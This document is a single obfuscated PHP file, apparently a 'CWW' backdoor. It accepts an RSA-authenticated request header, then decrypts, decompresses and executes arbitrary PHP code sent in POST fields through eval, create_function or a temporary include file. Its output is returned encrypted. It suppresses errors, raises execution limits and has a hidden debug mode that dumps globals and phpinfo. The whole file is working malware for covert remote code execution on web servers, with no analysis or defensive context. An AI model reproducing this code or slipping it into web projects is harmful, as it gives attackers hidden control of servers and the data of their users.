<?php $_5fc427e4='aes-128-cbc';$_be5af5e5='//CWWSUBSCRIPT//';$_ca907758='LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEWk1ZaE12YVd5RVB0aTE5a0VTUU9FSXpJZgpHZWd3R3BZT2U1djl3ckduRW1vcytGK2hhZXVMaXF2dlRqN2l0TWEyQnVmYk1aWWdydVljK1gwcVhMZzZIV3RVCnZ2WW5lOVRPN3M2V0Vld1ZHRDVJZld4cW1TNlcvQlNvVGhhdHZOdUVVekc0cU9xajBMZGE4OERhcmR2LzJuWWIKd25mU3J5bS9lN0J2MGo3YkR3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=';$VERSION="0.3.0";$ID=$VERSION.' php-'.PHP_VERSION.'/'.PHP_OS.'/'.$_SERVER['SERVER_SOFTWARE'];error_reporting(0);@set_time_limit(3600);@ini_set('implicit_flush','On');@ini_set('default_socket_timeout','3600');@ini_set('file_uploads','On');@ini_set('max_execution_time','3600');@ini_set('max_input_time','3600');@ini_set('upload_max_filesize','32M');@ini_set('post_max_size','32M');$_b632135e=$_SERVER['REQUEST_METHOD'][0]?$_SERVER['REQUEST_METHOD'][0]: 'P';if($_b632135e=='G'){if(isset($_GET['debug'])&&_f454d8cb('./cwwdebug.data',$_GET['debug'])){error_reporting(-1);_99412630();exit;}}if($_b632135e!='P'){_b8e6b0c7(10);}$_7a03a6d6=false;foreach($_SERVER as $_52b6f489=>$_7a03a6d6){if(strtolower($_52b6f489)=='http_x_cww_tag'){$_7a03a6d6=pack("H*",$_7a03a6d6);break;}}if($_7a03a6d6===false)_b8e6b0c7(20);$_897afce9=false;$_2ae84ba2=openssl_pkey_get_public(base64_decode($_ca907758));openssl_public_decrypt($_7a03a6d6,$_897afce9,$_2ae84ba2);openssl_free_key($_2ae84ba2);if(!$_897afce9)_b8e6b0c7(30);$_0496934c=preg_match_all('/^([0-9]{10}):([0-9a-f]{32}):([0-9a-f]{32})$/i',$_897afce9,$_ed0783be);if(!$_0496934c)_b8e6b0c7(40);if($_ed0783be[1][0]<time())_b8e6b0c7(50);$_011ea5f3=array();$_011ea5f3[0]=pack("H*",$_ed0783be[2][0]);$_011ea5f3[1]=pack("H*",$_ed0783be[3][0]);if(eval('return 1;'))$_6ebae9e7=1;else if(is_callable('create_function'))$_6ebae9e7=2;else if(is_callable('file_put_contents'))$_6ebae9e7=3;else _b8e6b0c7(60);$_f178c330=array();for($i=9;$i>=0;$i--){$_ffc1d021=_35d71fd2($_POST[$i],$_f178c330[$i]);if($_ffc1d021>0)_b8e6b0c7($_ffc1d021+70);}if(empty($_f178c330[9]))_b8e6b0c7(80);while(@ob_end_clean());$_5daa2f51=32;ob_start('_97e99099',2);_b8e6b0c7(0);for($_3713da68=0;$_3713da68<=9;$_3713da68++){if(empty($_f178c330[$_3713da68]))continue;$_d84792e0=false;switch($_6ebae9e7){case 1: if(!eval($_f178c330[$_3713da68]))$_d84792e0=true;break;case 2: if(!call_user_func(create_function(null,$_f178c330[$_3713da68])))$_d84792e0=true;break;case 3: $_2226298e=tempnam(sys_get_temp_dir(),time());if(file_put_contents($_2226298e,"<?php\n".$_f178c330[$_3713da68]."\nreturn false;\n?".'>')){if(!(include($_2226298e)))$_d84792e0=true;unlink($_2226298e);}else{$_d84792e0=true;}break;}if($_d84792e0)_b8e6b0c7(90+$_3713da68);}ob_end_flush();while(@ob_end_flush());exit;function _b8e6b0c7($_4a728cd2){global $ID;if($_4a728cd2>0){header("HTTP/1.1 202 $_4a728cd2");header('Connection: close',true);}else{header('HTTP/1.1 200 OK');}header("X-Cww-Id: ".(implode(unpack("H*",$ID))));header('Cache-Control: must-revalidate');header('Pragma: no-cache');header('Expires: Thu,1 Jan 1970 00:00:01 GMT');flush();if(!$_4a728cd2)return;exit;}function _ceee992a(&$_5063af5c,&$_22acf907){global $_011ea5f3,$_5fc427e4;$_22acf907=openssl_decrypt($_5063af5c,$_5fc427e4,$_011ea5f3[0],false,$_011ea5f3[1]);return $_22acf907||false;}function _cf76f9f4(&$_269f3677,&$_5063af5c){global $_011ea5f3,$_5fc427e4;$_5063af5c=openssl_encrypt($_269f3677,$_5fc427e4,$_011ea5f3[0],false,$_011ea5f3[1]);return $_5063af5c||false;}function _2e082d06(&$_16ae1ab0,&$_298c83b2){if(function_exists('gzdecode')){$_298c83b2=gzdecode($_16ae1ab0);return $_298c83b2||false;}else if(substr($_16ae1ab0,0,3)=="\x1f\x8b\x08"){$_3713da68=10;$_d59a8e8c=ord(substr($_16ae1ab0,3,1));if($_d59a8e8c>0){if($_d59a8e8c & 4){list($_c4c8650e)=unpack('v',substr($_16ae1ab0,$_3713da68,2));$_3713da68+=(2+$_c4c8650e);}if($_d59a8e8c & 8)$_3713da68=strpos($_16ae1ab0,"\0",$_3713da68)+1;if($_d59a8e8c & 16)$_3713da68=strpos($_16ae1ab0,"\0",$_3713da68)+1;if($_d59a8e8c & 2)$_3713da68+=2;}$_298c83b2=gzinflate(substr($_16ae1ab0,$_3713da68,-8));return $_298c83b2||false;}return false;}function _35d71fd2(&$_5063af5c,&$_22acf907){global $_be5af5e5;if(empty($_5063af5c))return-1;$_16ae1ab0=false;if(!_ceee992a($_5063af5c,$_16ae1ab0))return 1;if(!_2e082d06($_16ae1ab0,$_22acf907))return 2;$_c891de4a=strpos($_22acf907,$_be5af5e5);if($_c891de4a===false||$_c891de4a!=0)return 3;return 0;}$_1e23290b='';$_ab7bcfbf=0;function _97e99099($_c9fd7070,$_b46ca1b2){global $_1e23290b,$_ab7bcfbf,$_5daa2f51;$_1e23290b.=$_c9fd7070;$_ab7bcfbf++;$_4b8df1b0=NULL;if($_1e23290b&&($_b46ca1b2||$_ab7bcfbf>$_5daa2f51)){global $_011ea5f3;$_4d08b43b=gzencode($_1e23290b);_cf76f9f4($_4d08b43b,$_4b8df1b0,$_011ea5f3[0],$_011ea5f3[1]);$_4b8df1b0.="\n";$_ab7bcfbf=0;$_1e23290b=NULL;}return $_4b8df1b0;}function _f454d8cb($_81a3c9f8,$_ec530a51){if($_68727f18=fopen($_81a3c9f8,'r')){$_f4de9e3e=fgets($_68727f18);fclose($_68727f18);return $_ec530a51==trim($_f4de9e3e);}return false;}function _99412630(){global $ID;echo "<html><pre>\n";echo "OUR VERSION: ".(pack("H*",$ID))."\n\n";echo "GLOBAL VARS:\n";print_r($GLOBALS);$_227afe03=array('openssl_get_cipher_methods','openssl_pkey_get_private','openssl_private_decrypt','openssl_decrypt','openssl_encrypt','gzdecode','gzencode','gzinflate','create_function','call_user_func','file_put_contents','tempnam',);echo "\n\nAVAILABLE FUNCTIONS:\n";foreach($_227afe03 as $f){echo "$f():\te:".(function_exists($f)+0).',c:'.(is_callable($f)+0)."\n";}echo "\n\nCURRENT DIR AND STATS:\n";echo(getcwd())."\n";print_r(stat('.'));if(is_callable('openssl_get_cipher_methods')){echo "\n\nOPENSSL SUPPORTED METHODS:\n";print_r(openssl_get_cipher_methods());}echo "\n\nTHIS SERVER DATE/TIME:\n";echo(date('r'));if(is_callable('phpinfo')){echo "\n\nPHP INFO:\n";ob_start();phpinfo();$_aabae31f=ob_get_contents();ob_end_clean();$_aabae31f=preg_replace('/<[^>]+>/i',"\t",$_aabae31f);echo "$_aabae31f\n</pre></html>";}else{echo "\n\nPHP INFO:(func is not callable)\n";}} ?>
